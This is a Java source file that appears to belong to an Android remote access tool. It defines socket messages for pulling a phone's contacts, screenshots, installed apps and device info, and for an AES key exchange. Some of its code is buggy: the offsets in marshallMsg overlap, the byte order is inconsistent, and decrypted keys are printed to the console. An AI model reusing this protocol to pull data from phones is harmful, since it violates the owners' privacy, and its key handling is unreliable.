package afernandezb92.mrat.messages;
import android.util.Base64;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.sql.Timestamp;
import java.util.Arrays;

import afernandezb92.mrat.cipher.CipherAES;


public abstract class Mensaje {
    protected static final int TGETCONTACT = 1;
    protected static final int RGETCONTACT = 2;
    protected static final int TGETSCREENSHOT = 3;
    protected static final int TGETINSTALLEDAPPS = 4;
    protected static final int RGETINSTALLEDAPPS = 5;
    protected static final int TGETINFO = 6;
    protected static final int RGETINFO = 7;
    protected static final int TSENDID = 8;
    protected static final int TGETKEY = 9;
    protected static final int RGETKEY = 10;
    protected static final int TSENDKEY = 11;
    protected static final int ROK = 12;
    protected static final int RERR = 13;
    protected static final int INTSIZE = 4;
    private final int type;
    private final int tag;
    private static int taggen;
    DataOutputStream outstream = null;
    Socket socket = null;

    public Mensaje(int t, int msg){
        type = msg;
        tag = t;
    }

    protected static int  newTag(){
        taggen++;
        return taggen;
    }

    protected int getTag (){
        return tag;
    }

    public int getType(){
        int Type;
        Type = type;
        return Type;
    }

    public void writeTo(OutputStream o) throws Exception{
        DataOutputStream output =  new DataOutputStream(o);
        output.write(marshallInt(type));
        output.write(marshallInt(tag));
    }

    protected abstract void readFrom (InputStream i) throws Exception;

    public static Mensaje readMsg(InputStream i) throws Exception{
        Mensaje msg = null;
        int type = 7;
        int tag = 0;
        DataInputStream incon = new DataInputStream(i);
        byte [] buffer = new byte[INTSIZE];
        incon.read(buffer);
        type = unmarshallInt(buffer);
        buffer = new byte[INTSIZE];
        incon.read(buffer);
        tag = unmarshallInt(buffer);
        switch(type){
            case TGETCONTACT:
                msg = new Mensaje.TGetContact(tag);
                break;
            case RGETCONTACT:
                msg = new Mensaje.RGetContact(tag);
                break;
            case TGETSCREENSHOT:
                msg = new Mensaje.TGetScreenshot(tag);
                break;
            case TGETINSTALLEDAPPS:
                msg = new Mensaje.TGetInstalledApps(tag);
                break;
            case RGETINSTALLEDAPPS:
                msg = new Mensaje.RGetInstalledApps(tag);
                break;
            case TGETINFO:
                msg = new Mensaje.TGetInfo(tag);
                break;
            case RGETINFO:
                msg = new Mensaje.RGetInfo(tag);
                break;
            case TSENDID:
                msg = new Mensaje.TSendId(tag);
                break;
            case TGETKEY:
                msg = new Mensaje.TGetKey(tag);
                break;
            case RGETKEY:
                msg = new Mensaje.RGetKey(tag);
                break;
            case TSENDKEY:
                msg = new Mensaje.TSendKey(tag);
                break;
            case ROK:
                msg = new Mensaje.ROk(tag);
                break;
            case RERR:
                msg = new Mensaje.RErr(tag);
                break;
            default:
                System.out.println("Mensaje desconocido");
        }
        msg.readFrom(incon);
        return msg;
    }

    public String toString (){
        String tp;
        switch(type){
            case TGETCONTACT:
                tp = "TGET";
                break;
            case RGETCONTACT:
                tp = "RGET";
                break;
            case TGETSCREENSHOT:
                tp = "TGETSCREENSHOT";
                break;
            case TGETINSTALLEDAPPS:
                tp = "TGETINSTALLEDAPPS";
                break;
            case RGETINSTALLEDAPPS:
                tp = "RGETINSTALLEDAPPS";
                break;
            case TSENDID:
                tp = "TSENDID";
                break;
            case TGETINFO:
                tp = "TGETINFO";
                break;
            case RGETINFO:
                tp = "RGETINFO";
                break;
            case TGETKEY:
                tp = "TGETKEY";
                break;
            case RGETKEY:
                tp = "RGETKEY";
                break;
            case TSENDKEY:
                tp = "TSENDKEY";
                break;
            case ROK:
                tp = "ROK";
                break;
            case RERR:
                tp = "RERR";
                break;
            default:
                tp = "Mensaje Desconocido";
        }
        return tp;
    }

    public byte[] marshallMsg(byte[] key, byte[] keyMaster, Timestamp ts, int nonce) throws UnsupportedEncodingException{
        byte[] msgBytes = new byte[key.length + keyMaster.length + marshallInt(nonce).length + ts.toString().getBytes("UTF-8").length];
        System.arraycopy(key, 0, msgBytes, 0, key.length);
        System.arraycopy(keyMaster, 0, msgBytes, key.length, keyMaster.length);
        System.arraycopy(marshallInt(nonce), 0, msgBytes, keyMaster.length, marshallInt(nonce).length);
        System.arraycopy(ts.toString().getBytes("UTF-8"), 0, msgBytes, keyMaster.length, ts.toString().getBytes("UTF-8").length);
        return msgBytes;
    }

    public static byte[] marshallString(String s) throws UnsupportedEncodingException{
        byte[] b;
        b = s.getBytes("UTF-8");
        int size = b.length;
        byte[] marshall = new byte[size + INTSIZE];
        System.arraycopy(marshallInt(size), 0, marshall, 0, INTSIZE);
        System.arraycopy(b, 0, marshall, INTSIZE,size);
        return marshall;
    }

    public static String unmarshallString(byte[] b) throws UnsupportedEncodingException{
        String unmarshall = new String(b, "UTF-8");
        return unmarshall;
    }

    public static byte[] marshallInt(int value){
        byte[] marshall;
        byte b3 = (byte)((value >> 24) & 0xFF);
        byte b2 = (byte)((value >> 16) & 0xFF);
        byte b1 = (byte)((value >> 8) & 0xFF);
        byte b0 = (byte)(value & 0xFF);
        marshall = new byte[]{b0 , b1, b2, b3};
        return marshall;
    }

    public static int unmarshallInt(byte[] value){
        int a, b, c, d;
        a = (value[3] & 0xFF) << 24;
        b = (value[2] & 0xFF) << 16;
        c = (value[1] & 0xFF) << 8;
        d =  value[0] & 0xFF;
        return  a | b | c | d;
    }

    public static class TGetContact extends Mensaje{

        public TGetContact(int tag) {
            super(tag, TGETCONTACT);
        }

        public TGetContact(){
            super(newTag(), TGETCONTACT);
        }

        protected void readFrom(InputStream i) throws Exception {
            ;
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
        }

    }


    public static class RGetContact extends Mensaje{
        String[] names;
        String[] numbers;
        int numContacts;

        public RGetContact(int tag){
            super(tag, RGETCONTACT);
        }

        public RGetContact(TGetContact t, String[] nam, String[] num){
            super(t.getTag(), RGETCONTACT);
            names = nam;
            numbers = num;
        }

        public String[][] getValor(){
            String[][] contacts = new String[2][numContacts];
            contacts[0] = names;
            contacts[1] = numbers;
            return contacts;
        }

        protected void readFrom(InputStream i) throws IOException{
            DataInputStream incon = new DataInputStream(i);
            int lonnames = incon.readInt();
            numContacts = lonnames;
            String namesrec[] = new String[lonnames];
            for(int j = 0; j<lonnames; j++){
                namesrec[j] = incon.readUTF();
            }
            names = namesrec;
            int lonnumbers = incon.readInt();
            String numbersrec[] = new String[lonnumbers];
            for(int j = 0; j<lonnames; j++){
                numbersrec[j] = incon.readUTF();
            }
            numbers = numbersrec;
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            output.writeInt(names.length);
            for(int j = 0; j<names.length; j++){
                output.writeUTF(names[j]);
            }
            output.writeInt(numbers.length);
            for(int j = 0; j<numbers.length; j++){
                output.writeUTF(numbers[j]);
            }
        }

        public String toString(){
            return super.toString() + names + numbers;
        }
    }

    public static class TGetScreenshot extends Mensaje{

        public TGetScreenshot(int tag) {
            super(tag, TGETSCREENSHOT);
        }

        public TGetScreenshot(){
            super(newTag(), TGETSCREENSHOT);
        }

        protected void readFrom(InputStream i) throws Exception {
            ;
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
        }

    }

    public static class TGetInstalledApps extends Mensaje{

        public TGetInstalledApps(int tag) {
            super(tag, TGETINSTALLEDAPPS);
        }

        public TGetInstalledApps(){
            super(newTag(), TGETINSTALLEDAPPS);
        }

        protected void readFrom(InputStream i) throws Exception {
            ;
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
        }

    }

    public static class RGetInstalledApps extends Mensaje{
        String[] appsNames;
        int numApps;

        public RGetInstalledApps(int tag){
            super(tag, RGETINSTALLEDAPPS);
        }

        public RGetInstalledApps(TGetInstalledApps t, String[] apps){
            super(t.getTag(), RGETINSTALLEDAPPS);
            appsNames = apps;
        }

        public String[] getValor(){
            return appsNames;
        }

        protected void readFrom(InputStream i) throws IOException{
            DataInputStream incon = new DataInputStream(i);
            int lonnames = incon.readInt();
            numApps = lonnames;
            String namesrec[] = new String[lonnames];
            for(int j = 0; j<lonnames; j++){
                namesrec[j] = incon.readUTF();
            }
            appsNames = namesrec;
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            output.writeInt(appsNames.length);
            for(int j = 0; j<appsNames.length; j++){
                output.writeUTF(appsNames[j]);
            }
        }

        public String toString(){
            return super.toString() + appsNames;
        }
    }

    public static class TGetInfo extends Mensaje{

        public TGetInfo(int tag) {
            super(tag, TGETINFO);
        }

        public TGetInfo(){
            super(newTag(), TGETINFO);
        }

        protected void readFrom(InputStream i) throws Exception {
            ;
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
        }

    }

    public static class RGetInfo extends Mensaje{
        String info;

        public RGetInfo(int tag){
            super(tag, RGETINFO);
        }

        public RGetInfo(TGetInfo t, String inf){
            super(t.getTag(), RGETINFO);
            info = inf;
        }

        public String getValor(){
            return info;
        }

        protected void readFrom(InputStream i) throws IOException{
            DataInputStream incon = new DataInputStream(i);
            info = incon.readUTF();
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            output.writeUTF(info);
        }

        public String toString(){
            return super.toString() + info;
        }
    }

    public static class TGetKey extends Mensaje{

        public TGetKey(int tag) {
            super(tag, TGETKEY);
        }

        public TGetKey(){
            super(newTag(), TGETKEY);
        }

        protected void readFrom(InputStream i) throws Exception {
            ;
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
        }

    }

    public static class RGetKey extends Mensaje{
        String key;

        public RGetKey(int tag){
            super(tag, RGETKEY);
        }

        public RGetKey(TGetKey t, String k){
            super(t.getTag(), RGETKEY);
            key = k;
        }

        public String getValor(){
            return key;
        }

        protected void readFrom(InputStream i) throws IOException{
            DataInputStream incon = new DataInputStream(i);
            key = incon.readUTF();
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            output.writeUTF(key);
        }

        public String toString(){
            return super.toString() + key;
        }
    }

    public static class TSendKey extends Mensaje{
        byte[] key, keyMaster, msgBytes;
        Timestamp ts;
        int nonce;

        public TSendKey(int tag) {
            super(tag, TSENDKEY);
        }

        public TSendKey(byte[] k, byte[] km, Timestamp t, int n){
            super(newTag(), TSENDKEY);
            key = k;
            keyMaster = km;
            ts = t;
            nonce = n;
        }

        public byte[] getKeyEncrypt(){
            return keyMaster;
        }

        public int getNonceEncrypt(){
            return nonce;
        }

        protected void readFrom(InputStream i) throws Exception {
            DataInputStream incon = new DataInputStream(i);
            byte [] buffer = new byte[INTSIZE];
            incon.read(buffer);
            int size = unmarshallInt(buffer);
            System.out.println("Size " + size);
            buffer = new byte[size];
            incon.read(buffer);
            System.out.println("Msg: " + new String(Base64.encodeToString(buffer, Base64.DEFAULT)));
            byte[] decipherMsg = new byte[size];
            decipherMsg = CipherAES.decipherInGCMMode(buffer);
            byte[] key = new byte[256/8];
            key = Arrays.copyOfRange(decipherMsg, 0, 256/8);
            System.out.println(new String(Base64.encodeToString(key, Base64.DEFAULT)));
        }

        public void writeTo(OutputStream o) throws Exception{
            CipherAES cipher = new CipherAES(key);
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            msgBytes = marshallMsg(key, keyMaster, ts, nonce);
            output.write(cipher.cipherInGCMMode(msgBytes));
        }

    }

    public static class TSendId extends Mensaje{
        int id;

        public TSendId(int i){
            super(newTag(), TSENDID);
            id = i;
        }

        public TSendId(Mensaje t, int i){
            super(t.getTag(), TSENDID);
            id = i;
        }

        public int getId(){
            return id;
        }

        protected void readFrom(InputStream i) throws Exception {
            DataInputStream incon = new DataInputStream(i);
            id = incon.readInt();
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            output.writeInt(id);
        }

        public String toString(){
            return super.toString() + " ID: " + id;
        }
    }

    public static class ROk extends Mensaje{
        String timeStamp, nonce;

        public ROk(int tag){
            super(tag, ROK);
        }

        public ROk(Mensaje t, String ts, String n){
            super(t.getTag(), ROK);
            timeStamp = ts;
            nonce = n;
        }

        public String getNonce(){
            return nonce;
        }

        public String getTimeStamp(){
            return timeStamp;
        }

        protected void readFrom(InputStream i) throws Exception {
            DataInputStream incon = new DataInputStream(i);
            timeStamp = incon.readUTF();
            nonce = incon.readUTF();
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            output.writeUTF(timeStamp);
            output.writeUTF(nonce);
        }
    }

    public static class RErr extends Mensaje{
        private String error;

        public RErr(int tag){
            super(tag, RERR);
        }

        public RErr(Mensaje t, String e){
            super(t.getTag(), RERR);
            error = e;
        }

        public String getError(){
            return error;
        }

        protected void readFrom(InputStream i) throws Exception {
            DataInputStream incon = new DataInputStream(i);
            error = incon.readUTF();
        }

        public void writeTo(OutputStream o) throws Exception{
            super.writeTo(o);
            DataOutputStream output = new DataOutputStream(o);
            output.writeUTF(error);
        }

        public String toString(){
            return super.toString() + " Error: " + error;
        }
    }

}
